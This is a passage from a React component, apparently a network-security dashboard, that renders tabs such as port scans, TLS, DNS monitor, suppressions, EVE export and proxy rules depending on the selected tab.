      {tab==="qos"         &&<QosTab/>}
      {tab==="wan"         &&<WanGroupsTab/>}
      {tab==="stateTable"  &&<StateTableTab/>}
      {tab==="portscans"   &&<PortscansTab/>}
      {tab==="tls"         &&<TlsTab/>}
      {tab==="dnsMonitor"  &&<DnsMonitorTab/>}
      {tab==="suppressions"&&<SuppressionsTab/>}
      {tab==="eveExport"   &&<EveExportTab/>}
      {tab==="proxy"       &&<ProxyRulesTab/>}
    </div>
  );
}
